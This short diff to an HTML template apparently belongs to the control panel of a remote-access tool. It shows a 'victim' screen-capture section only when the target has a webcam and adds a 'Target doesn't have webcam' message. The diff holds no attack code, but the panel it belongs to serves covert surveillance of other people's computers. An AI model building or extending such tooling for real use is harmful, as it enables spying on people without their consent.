@@ -1,6 +1,8 @@
 {% extends "server/session.html" %}
 {% block session_content %}
 
+
+{% if has_webcam %}
 <p>Vous pouvez prendre des captures d'écran de l'écran de la victime.</p>
 
 <p class="mb-4 text-center mt-3">
@@ -24,6 +26,11 @@
 				{% endfor %}
     </div>
 </div>
+{% endif %}
+
+	{% if not has_webcam %}
+	<p class="text-center"><font color="red">Target doesn't have webcam.</font></p>
+	{% endif %}
 
 
 {% endblock %}
